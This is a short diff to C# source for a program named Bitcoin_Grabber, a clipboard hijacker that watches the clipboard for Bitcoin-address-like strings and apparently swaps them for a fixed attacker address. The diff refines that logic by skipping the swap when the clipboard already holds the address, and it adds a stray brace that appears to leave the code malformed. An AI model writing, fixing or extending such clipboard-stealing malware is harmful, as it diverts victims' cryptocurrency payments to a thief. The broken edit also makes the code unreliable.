@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Windows.Forms;
 using System.Threading;
 
@@ -24,6 +24,8 @@ namespace Bitcoin_Grabber
 
             for (; ; )
             {
+            if (Clipboard.GetText() != ADDR)
+            {
                 if (Clipboard.GetText().Length >= 26 && Clipboard.GetText().Length <= 35)
                 {
                     if (Clipboard.GetText().StartsWith("1") ||
@@ -37,6 +39,7 @@ namespace Bitcoin_Grabber
                         { ApartmentState = ApartmentState.STA }.Start();
                     }
                 }
+                {
                 Thread.Sleep(10);
             }
 
